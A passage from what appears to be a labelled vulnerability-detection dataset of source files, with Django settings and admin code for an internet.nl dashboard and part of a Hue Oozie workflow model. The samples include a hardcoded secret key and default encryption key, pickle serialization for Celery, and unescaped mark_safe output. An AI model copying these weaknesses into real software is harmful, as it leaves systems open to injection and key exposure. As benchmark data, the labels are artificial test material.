tasks through in the process but to no hard except for a slight drop in\n# overall throughput/performance). A to high value for the prefetch multiplier\n# might result in high priority tasks not being picked up as Celery does not\n# seem to do prioritisation in worker queues but only on the broker\n# queues. The value of 2 is currently selected because it higher than 1,\n# behaviour needs to be observed to decide if raising this results in\n# further improvements without impacting the priority feature.\nCELERY_WORKER_PREFETCH_MULTIPLIER = 2\n\n# numer of tasks to be executed in parallel by celery\nCELERY_WORKER_CONCURRENCY = 10\n\n# Workers will scale up and scale down depending on the number of tasks\n# available. To prevent workers from scaling down while still doing work,\n# the ACKS_LATE setting is used. This insures that a task is removed from\n# the task queue after the task is performed. This might result in some\n# issues where tasks that don't finish or crash keep being executed:\n# thus for tasks that are not programmed perfectly it will raise a number\n# of repeated exceptions which will need to be debugged.\nCELERY_ACKS_LATE = True\n\nTOOLS = {\n    'organizations': {\n        'import_data_dir': '',\n    },\n}\n\nOUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')\nVENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')\n\nif DEBUG:\n    # too many sql variables....\n    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000\n\n\n# Compression\n# Django-compressor is used to compress css and js files in production\n# During development this is disabled as it does not provide any feature there\n# Django-compressor configuration defaults take care of this.\n# https://django-compressor.readthedocs.io/en/latest/usage/\n# which plugins to use to find static files\nSTATICFILES_FINDERS = (\n    # default static files finders\n    'django.contrib.staticfiles.finders.FileSystemFinder',\n    'django.contrib.staticfiles.finders.AppDirectoriesFinder',\n    # other finders..\n    'compressor.finders.CompressorFinder',\n)\n\nCOMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']\n\n# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.\n# Now using the default, so not explicitly adding that to the settings\n# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']\n\n# Brotli compress storage gives some issues.\n# This creates the original compressed and a gzipped compressed file.\nCOMPRESS_STORAGE = (\n    'compressor.storage.GzipCompressorFileStorage'\n)\n\n# Enable static file (js/css) compression when not running debug\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE\nCOMPRESS_OFFLINE = not DEBUG\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED\n# Enabled when debug is off by default.\n/n/n/n", "label": 0}, {"id": "9c1c17e55e436e0f6a5f7271c39d77d8a6890738", "code": "/dashboard/internet_nl_dashboard/admin.py/n/nfrom datetime import datetime, timedelta\n\nimport pytz\nfrom constance.admin import Config, ConstanceAdmin, ConstanceForm\nfrom cryptography.fernet import Fernet\nfrom django.conf import settings\nfrom django.contrib import admin\nfrom django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin\nfrom django.contrib.auth.admin import UserAdmin as BaseUserAdmin\nfrom django.contrib.auth.models import Group, User\nfrom django.contrib.humanize.templatetags.humanize import naturaltime\nfrom django.utils.safestring import mark_safe\nfrom django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm\nfrom django_celery_beat.models import CrontabSchedule, PeriodicTask\nfrom import_export import resources\nfrom import_export.admin import ImportExportModelAdmin\n\nfrom dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList\n\n\nclass MyPeriodicTaskForm(PeriodicTaskForm):\n\n    fieldsets = PeriodicTaskAdmin.fieldsets\n\n    \"\"\"\n    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.\n    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy\n    when something will run.\n\n    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.\n    Crontab would be half-great if the parameters where named.\n\n    Get your crontab guru going, this is the only way you'll understand what you're doing.\n    https://crontab.guru/#0_21_*_*_*\n    \"\"\"\n\n    def clean(self):\n        print('cleaning')\n\n        cleaned_data = super(PeriodicTaskForm, self).clean()\n\n        # if not self.cleaned_data['last_run_at']:\n        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)\n\n        return cleaned_data\n\n\nclass IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):\n    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.\n\n    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',\n                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')\n\n    list_filter = ('enabled', 'queue', 'crontab')\n\n    search_fields = ('name', 'queue', 'args')\n\n    form = MyPeriodicTaskForm\n\n    save_as = True\n\n    @staticmethod\n    def name_safe(obj):\n        return mark_safe(obj.name)\n\n    @staticmethod\n    def last_run(obj):\n        return obj.last_run_at\n\n    @staticmethod\n    def runs(obj):\n        # print(dir(obj))\n        return obj.total_run_count\n\n    @staticmethod\n    def due(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return naturaltime(date)\n\n    @staticmethod\n    def precise(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))\n\n    @staticmethod\n    def next(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            # somehow the cron jobs still give the correct countdown even last_run_at is not set.\n\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return date\n\n    class Meta:\n        ordering = [\"-name\"]\n\n\nclass IECrontabSchedule(ImportExportModelAdmin):\n    pass\n\n\nadmin.site.unregister(PeriodicTask)\nadmin.site.unregister(CrontabSchedule)\nadmin.site.register(PeriodicTask, IEPeriodicTaskAdmin)\nadmin.site.register(CrontabSchedule, IECrontabSchedule)\n\n\nclass DashboardUserInline(admin.StackedInline):\n    model = DashboardUser\n    can_delete = False\n    verbose_name_plural = 'Dashboard Users'\n\n\n# Thank you:\n# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1\nclass UserResource(resources.ModelResource):\n    class Meta:\n        model = User\n        # fields = ('first_name', 'last_name', 'email')\n\n\nclass GroupResource(resources.ModelResource):\n    class Meta:\n        model = Group\n\n\nclass UserAdmin(BaseUserAdmin, ImportExportModelAdmin):\n    resource_class = UserResource\n    inlines = (DashboardUserInline, )\n\n    list_display = ('username', 'first_name', 'last_name',\n                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')\n\n    actions = []\n\n    @staticmethod\n    def in_groups(obj):\n        value = \"\"\n        for group in obj.groups.all():\n            value += group.name\n        return value\n\n\n# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)\nclass GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):\n    resource_class = GroupResource\n\n\nadmin.site.unregister(User)\nadmin.site.register(User, UserAdmin)\nadmin.site.unregister(Group)\nadmin.site.register(Group, GroupAdmin)\n\n\n# todo: make sure this is implemented.\n# Overwrite the ugly Constance forms with something nicer\nclass CustomConfigForm(ConstanceForm):\n    def __init__(self, *args, **kwargs):\n        super(CustomConfigForm, self).__init__(*args, **kwargs)\n        # ... do stuff to make your settings form nice ...\n\n\nclass ConfigAdmin(ConstanceAdmin):\n    change_list_form = CustomConfigForm\n    change_list_template = 'admin/config/settings.html'\n\n\nadmin.site.unregister([Config])\nadmin.site.register([Config], ConfigAdmin)\n\n\n@admin.register(Account)\nclass AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'enable_logins', 'internet_nl_api_username')\n    search_fields = ('name', )\n    list_filter = ['enable_logins'][::-1]\n    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')\n\n    def save_model(self, request, obj, form, change):\n\n        # If the internet_nl_api_password changed, encrypt the new value.\n        # Example usage and docs: https://github.com/pyca/cryptography\n        if 'internet_nl_api_password' in form.changed_data:\n            f = Fernet(settings.FIELD_ENCRYPTION_KEY)\n            encrypted = f.encrypt(obj.internet_nl_api_password.encode())\n            obj.internet_nl_api_password = encrypted\n\n            # You can decrypt using f.decrypt(token)\n\n        super().save_model(request, obj, form, change)\n\n    actions = []\n\n\n@admin.register(UrlList)\nclass UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'account', )\n    search_fields = ('name', 'account__name')\n    list_filter = ['account'][::-1]\n    fields = ('name', 'account', 'urls')\n\n\n@admin.register(UploadLog)\nclass UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n    search_fields = ('internal_filename', 'orginal_filename', 'message')\n    list_filter = ['message', 'upload_date', 'user'][::-1]\n\n    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n/n/n/n/dashboard/settings.py/n/n\"\"\"\nDjango settings for dashboard project.\n\nGenerated by 'django-admin startproject' using Django 2.1.7.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/2.1/ref/settings/\n\"\"\"\n\nimport os\nfrom datetime import timedelta\n\nfrom django.utils.translation import gettext_lazy as _\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\n# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nSETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    # Constance\n    'constance',\n    'constance.backends.database',\n\n    # Jet\n    'jet.dashboard',\n    'jet',\n\n    # Import Export\n    'import_export',\n\n    # Standard Django\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'django.contrib.humanize',\n\n    # Periodic tasks\n    'django_celery_beat',\n\n    # Javascript and CSS compression:\n    'compressor',\n\n    # Web Security Map (todo: minimize the subset)\n    # The reason (model) why it's included is in the comments.\n    'websecmap.app',  # Job\n    'websecmap.organizations',  # Url\n    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan\n    'websecmap.reporting',  # Various reporting functions (might be not needed)\n    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.\n    'websecmap.pro',  # some model inlines\n\n    # Custom Apps\n    # These apps overwrite whatever is declared above, for example the user information.\n    'dashboard.internet_nl_dashboard',\n\n    # Two factor auth\n    'django_otp',\n    'django_otp.plugins.otp_static',\n    'django_otp.plugins.otp_totp',\n    'two_factor',\n]\n\ntry:\n    # hack to disable django_uwsgi app as it currently conflicts with compressor\n    # https://github.com/django-compressor/django-compressor/issues/881\n    if not os.environ.get('COMPRESS', False):\n        import django_uwsgi  # NOQA\n\n        INSTALLED_APPS += ['django_uwsgi', ]\nexcept ImportError:\n    # only configure uwsgi app if installed (ie: production environment)\n    pass\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n\n    # Two factor Auth\n    'django_otp.middleware.OTPMiddleware',\n]\n\nROOT_URLCONF = 'dashboard.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            BASE_DIR + '/',\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'constance.context_processors.config',\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'dashboard.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/2.1/ref/settings/#databases\n\nDATABASE_OPTIONS = {\n    'mysql': {'init_command': \"SET character_set_connection=utf8,\"\n                              \"collation_connection=utf8_unicode_ci,\"\n                              \"sql_mode='STRICT_ALL_TABLES';\"},\n}\nDB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')\nDATABASE_ENGINES = {\n    'mysql': 'dashboard.app.backends.mysql',\n}\nDATABASES_SETTINGS = {\n    # persisten local database used during development (runserver)\n    'dev': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # sqlite memory database for running tests without\n    'test': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),\n    },\n    # for production get database settings from environment (eg: docker)\n    'production': {\n        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),\n        'NAME': os.environ.get('DB_NAME', 'dashboard'),\n        'USER': os.environ.get('DB_USER', 'dashboard'),\n        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),\n        'HOST': os.environ.get('DB_HOST', 'mysql'),\n        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})\n    }\n}\n# allow database to be selected through environment variables\nDATABASE = os.environ.get('DJANGO_DATABASE', 'dev')\nDATABASES = {'default': DATABASES_SETTINGS[DATABASE]}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/2.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\nLOCALE_PATHS = ['locale']\n\nLANGUAGE_COOKIE_NAME = 'dashboard_language'\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/2.1/howto/static-files/\n\nSTATIC_URL = '/static/'\n\n# Absolute path to aggregate to and serve static file from.\nif DEBUG:\n    STATIC_ROOT = 'static'\nelse:\n    STATIC_ROOT = '/srv/dashboard/static/'\n\n\nJET_SIDE_MENU_ITEMS = [\n\n    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n        {'name': 'auth.user'},\n        {'name': 'auth.group'},\n        {'name': 'constance.config', 'label': _('Configuration')},\n    ]},\n\n    {'label': _('Dashboard'), 'items': [\n        {'name': 'internet_nl_dashboard.account'},\n        {'name': 'internet_nl_dashboard.urllist'},\n        {'name': 'internet_nl_dashboard.uploadlog'},\n    ]},\n\n    {'label': _('\ud83d\udd52 Periodic Tasks'), 'items': [\n        {'name': 'app.job'},\n        {'name': 'django_celery_beat.periodictask'},\n        {'name': 'django_celery_beat.crontabschedule'},\n    ]},\n\n]\n\nMEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\nUPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')\n\n\n# Two factor auth\nLOGIN_URL = \"two_factor:login\"\nLOGIN_REDIRECT_URL = \"/dashboard/\"\nLOGOUT_REDIRECT_URL = LOGIN_URL\nTWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'\n# 6 supports google authenticator\nTWO_FACTOR_TOTP_DIGITS = 6\nTWO_FACTOR_PATCH_ADMIN = True\n\n# Encrypted fields\n# Note that this key is not stored in the database. As... well if you have the database, you have the key.\nFIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')\n\nif not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':\n    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '\n                     'default key provided. Please create a new key. Instructions are listed here:'\n                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')\n\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',  # sys.stdout\n            'formatter': 'color',\n        },\n    },\n    'formatters': {\n        'debug': {\n            'format': '%(asctime)s\\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '\n                      '%(funcName)20s() - %(message)s',\n        },\n        'color': {\n            '()': 'colorlog.ColoredFormatter',\n            'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s - '\n                      '%(message)s',\n            'datefmt': '%Y-%m-%d %H:%M',\n            'log_colors': {\n                'DEBUG': 'green',\n                'INFO': 'white',\n                'WARNING': 'yellow',\n                'ERROR': 'red',\n                'CRITICAL': 'bold_red',\n            },\n        }\n    },\n    'loggers': {\n        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.\n        # Would you enable it, all logging messages will be logged twice.\n        # '': {\n        #     'handlers': ['console'],\n        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        # },\n\n        # Default Django logging, we expect django to work, and therefore only show INFO messages.\n        # It can be smart to sometimes want to see what's going on here, but not all the time.\n        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions\n        'django': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),\n        },\n\n        # We expect to be able to debug websecmap all of the time.\n        'dashboard': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),\n        },\n    },\n}\n\n\n# settings to get WebSecMap to work:\n# Celery 4.0 settings\n# Pickle can work, but you need to use certificates to communicate (to verify the right origin)\n# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not\n# even serialize dicts.\n# http://docs.celeryproject.org/en/latest/userguide/configuration.html\nCELERY_accept_content = ['pickle', 'yaml']\nCELERY_task_serializer = 'pickle'\nCELERY_result_serializer = 'pickle'\n\n\n# Celery config\nCELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')\nENABLE_UTC = True\n\n# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# this stuff... message signing makes it a bit better, not perfect as it peels the onion.\n# see: https://blog.nelhage.com/2011/03/exploiting-pickle/\n# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds\n# of directions to get the job done. Intermediate tables to store results could be an option.\nCELERY_ACCEPT_CONTENT = ['pickle']\nCELERY_TASK_SERIALIZER = 'pickle'\nCELERY_RESULT_SERIALIZER = 'pickle'\nCELERY_TIMEZONE = 'UTC'\n\nCELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'\n\nCELERY_BROKER_CONNECTION_MAX_RETRIES = 1\nCELERY_BROKER_CONNECTION_RETRY = False\nCELERY_RESULT_EXPIRES = timedelta(hours=4)\n\n# Use the value of 2 for celery prefetch multiplier. Previous was 1. The\n# assumption is that 1 will block a worker thread until the current (rate\n# limited) task is completed. When using 2 (or higher) the assumption is that\n# celery will drop further rate limited task from the internal worker queue and\n# fetch other tasks tasks that could be executed (spooling other rate limited\n# tasks through in the process but to no hard except for a slight drop in\n# overall throughput/performance). A to high value for the prefetch multiplier\n# might result in high priority tasks not being picked up as Celery does not\n# seem to do prioritisation in worker queues but only on the broker\n# queues. The value of 2 is currently selected because it higher than 1,\n# behaviour needs to be observed to decide if raising this results in\n# further improvements without impacting the priority feature.\nCELERY_WORKER_PREFETCH_MULTIPLIER = 2\n\n# numer of tasks to be executed in parallel by celery\nCELERY_WORKER_CONCURRENCY = 10\n\n# Workers will scale up and scale down depending on the number of tasks\n# available. To prevent workers from scaling down while still doing work,\n# the ACKS_LATE setting is used. This insures that a task is removed from\n# the task queue after the task is performed. This might result in some\n# issues where tasks that don't finish or crash keep being executed:\n# thus for tasks that are not programmed perfectly it will raise a number\n# of repeated exceptions which will need to be debugged.\nCELERY_ACKS_LATE = True\n\nTOOLS = {\n    'organizations': {\n        'import_data_dir': '',\n    },\n}\n\nOUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')\nVENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')\n\nif DEBUG:\n    # too many sql variables....\n    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000\n\n\n# Compression\n# Django-compressor is used to compress css and js files in production\n# During development this is disabled as it does not provide any feature there\n# Django-compressor configuration defaults take care of this.\n# https://django-compressor.readthedocs.io/en/latest/usage/\n# which plugins to use to find static files\nSTATICFILES_FINDERS = (\n    # default static files finders\n    'django.contrib.staticfiles.finders.FileSystemFinder',\n    'django.contrib.staticfiles.finders.AppDirectoriesFinder',\n    # other finders..\n    'compressor.finders.CompressorFinder',\n)\n\nCOMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']\n\n# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.\n# Now using the default, so not explicitly adding that to the settings\n# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']\n\n# Brotli compress storage gives some issues.\n# This creates the original compressed and a gzipped compressed file.\nCOMPRESS_STORAGE = (\n    'compressor.storage.GzipCompressorFileStorage'\n)\n\n# Enable static file (js/css) compression when not running debug\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE\nCOMPRESS_OFFLINE = not DEBUG\n# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED\n# Enabled when debug is off by default.\n/n/n/n", "label": 1}, {"id": "6641c62beaa1468082e47d82da5ed758d11c7735", "code": "apps/oozie/src/oozie/models2.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport re\nimport time\nimport uuid\n\nfrom datetime import datetime, timedelta\nfrom dateutil.parser import parse\nfrom string import Template\n\nfrom django.utils.encoding import force_unicode\nfrom desktop.lib.json_utils import JSONEncoderForHTML\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib import django_mako\nfrom desktop.models import Document2\n\nfrom hadoop.fs.hadoopfs import Hdfs\nfrom liboozie.submission2 import Submission\nfrom liboozie.submission2 import create_directories\n\nfrom oozie.conf import REMOTE_SAMPLE_DIR\nfrom oozie.models import Workflow as OldWorflows\nfrom oozie.utils import utc_datetime_format\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass Job(object):\n  \n  def find_all_parameters(self, with_lib_path=True):\n    params = self.find_parameters()\n\n    for param in self.parameters:\n      params[param['name'].strip()] = param['value']\n\n    return  [{'name': name, 'value': value} for name, value in params.iteritems() if with_lib_path or name != 'oozie.use.system.libpath']  \n\n  @classmethod\n  def get_workspace(cls, user):\n    return REMOTE_SAMPLE_DIR.get().replace('$USER', user.username).replace('$TIME', str(time.time()))\n\n  @property\n  def validated_name(self):\n    good_name = []\n\n    for c in self.name[:40]:\n      if not good_name:\n        if not re.match('[a-zA-Z_]', c):\n          c = '_'\n      else:\n        if not re.match('[\\-_a-zA-Z0-9]', c):        \n          c = '_'\n      good_name.append(c)\n      \n    return ''.join(good_name)\n\n\nclass Workflow(Job):\n  XML_FILE_NAME = 'workflow.xml'\n  PROPERTY_APP_PATH = 'oozie.wf.application.path'\n  SLA_DEFAULT = [\n      {'key': 'enabled', 'value': False},\n      {'key': 'nominal-time', 'value': ''},\n      {'key': 'should-start', 'value': ''},\n      {'key': 'should-end', 'value': ''},\n      {'key': 'max-duration', 'value': ''},\n      {'key': 'alert-events', 'value': ''},\n      {'key': 'alert-contact', 'value': ''},\n      {'key': 'notification-msg', 'value': ''},\n      {'key': 'upstream-apps', 'value': ''},\n  ]\n  HUE_ID = 'hue-id-w'\n  \n  def __init__(self, data=None, document=None, workflow=None):\n    self.document = document\n\n    if document is not None:\n      self.data = document.data\n    elif data is not None:\n      self.data = data\n    else:\n      self.data = json.dumps({\n          'layout': [{\n              \"size\":12, \"rows\":[\n                  {\"widgets\":[{\"size\":12, \"name\":\"Start\", \"id\":\"3f107997-04cc-8733-60a9-a4bb62cebffc\", \"widgetType\":\"start-widget\", \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span12\"}]},\n                  {\"widgets\":[{\"size\":12, \"name\":\"End\", \"id\":\"33430f0f-ebfa-c3ec-f237-3e77efa03d0a\", \"widgetType\":\"end-widget\", \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span12\"}]},\n                  {\"widgets\":[{\"size\":12, \"name\":\"Kill\", \"id\":\"17c9c895-5a16-7443-bb81-f34b30b21548\", \"widgetType\":\"kill-widget\", \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span12\"}]}\n              ],\n              \"drops\":[ \"temp\"],\n              \"klass\":\"card card-home card-column span12\"\n          }],\n          'workflow': workflow if workflow is not None else {\n              \"id\": None, \n              \"uuid\": None,\n              \"name\": \"My Workflow\",\n              \"properties\": {\n                  \"description\": \"\",\n                  \"job_xml\": \"\",\n                  \"sla_enabled\": False,\n                  \"schema_version\": \"uri:oozie:workflow:0.5\",\n                  \"sla_workflow_enabled\": False,\n                  \"credentials\": [],\n                  \"properties\": [],\n                  \"sla\": Workflow.SLA_DEFAULT,\n                  \"show_arrows\": True,\n              },\n              \"nodes\":[\n                  {\"id\":\"3f107997-04cc-8733-60a9-a4bb62cebffc\",\"name\":\"Start\",\"type\":\"start-widget\",\"properties\":{},\"children\":[{'to': '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'}]},            \n                  {\"id\":\"33430f0f-ebfa-c3ec-f237-3e77efa03d0a\",\"name\":\"End\",\"type\":\"end-widget\",\"properties\":{},\"children\":[]},\n                  {\"id\":\"17c9c895-5a16-7443-bb81-f34b30b21548\",\"name\":\"Kill\",\"type\":\"kill-widget\",\"properties\":{'message': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]')},\"children\":[]}\n              ]\n          }\n      })\n      \n  @property\n  def id(self):\n    return self.document.id  \n  \n  @property\n  def uuid(self):\n    return self.document.uuid   \n  \n  def get_json(self):\n    _data = self.get_data()\n\n    return json.dumps(_data)\n \n  def get_data(self):\n    _data = json.loads(self.data)\n    \n    if self.document is not None:\n      _data['workflow']['id'] = self.document.id\n      _data['workflow']['dependencies'] = list(self.document.dependencies.values('uuid',))\n    else:\n      _data['workflow']['dependencies'] = []\n\n    if 'parameters' not in _data['workflow']['properties']:\n      _data['workflow']['properties']['parameters'] = [\n          {'name': 'oozie.use.system.libpath', 'value': True},\n      ]\n    if 'show_arrows' not in _data['workflow']['properties']:\n      _data['workflow']['properties']['show_arrows'] = True\n\n    return _data\n  \n  def to_xml(self, mapping=None):\n    if mapping is None:\n      mapping = {}\n    tmpl = 'editor/gen2/workflow.xml.mako'\n\n    data = self.get_data()\n    nodes = [node for node in self.nodes if node.name != 'End'] + [node for node in self.nodes if node.name == 'End'] # End at the end\n    node_mapping = dict([(node.id, node) for node in nodes])\n    \n    sub_wfs_ids = [node.data['properties']['workflow'] for node in nodes if node.data['type'] == 'subworkflow']\n    workflow_mapping = dict([(workflow.uuid, Workflow(document=workflow)) for workflow in Document2.objects.filter(uuid__in=sub_wfs_ids)])\n\n    xml = re.sub(re.compile('\\s*\\n+', re.MULTILINE), '\\n', django_mako.render_to_string(tmpl, {\n              'wf': self,\n              'workflow': data['workflow'],\n              'nodes': nodes,\n              'mapping': mapping,\n              'node_mapping': node_mapping,\n              'workflow_mapping': workflow_mapping\n          }))\n    return force_unicode(xml)\n\n  @property\n  def name(self):\n    _data = self.get_data()\n    return _data['workflow']['name']\n  \n  def update_name(self, name):\n    _data = self.get_data()\n    _data['workflow']['name'] = name\n    self.data = json.dumps(_data)  \n\n  @property      \n  def deployment_dir(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['deployment_dir']\n  \n  @property      \n  def 